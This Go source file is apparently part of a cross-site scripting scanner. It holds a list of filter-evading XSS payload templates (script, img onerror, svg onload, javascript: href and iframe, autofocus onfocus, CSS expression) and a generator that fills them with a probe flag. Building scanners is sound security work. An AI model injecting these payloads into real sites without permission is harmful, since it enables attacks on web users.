package Xss

import (
	"fmt"
	"math/rand"
	"net/url"
	"time"
)

type Xss struct {
	RawString string
	Url       *url.URL
	Query     *url.Values
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
var htmlmode = 1

func RandStringRunes(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

var (
	script_payload string = "<ScRiPt>%s</sCrIpT>"
	//JaVaScRiPt_payload string = "<ScRiPt>JaVaScRiPt:var %s</sCrIpT>"
	img_payload     string = "<iMg SrC=1 oNeRrOr=%s>"
	href_payload    string = "<a HrEf=JaVaScRiPt:%s>cLiCk</A>"
	svg_payload     string = "<sVg/OnLoAd=%s>"
	iframe_payload  string = "<IfRaMe SrC=jAvAsCrIpT:%s>"
	input_payload   string = "<input autofocus onfocus=%s>"
	style_payload   string = "expression(a(%s))"
	payload3_prompt string = "prompt(1)"
)

type Generator struct {
	words []string
	i     int
	value string
}

func (g *Generator) Next() bool {
	if g.i == len(g.words) {
		return false
	}
	g.value = g.words[g.i]
	g.i++
	return true
}

func (g *Generator) Value() interface{} {
	return g.value
}

//GeneratorPayload 生成payload
func (g *Generator) GeneratorPayload(mode int, flag string) string {
	if htmlmode == mode {
		g.Next()
		switch s := g.Value().(type) {
		case string:
			return fmt.Sprintf(s, flag)
		}
	}
	return ""
}
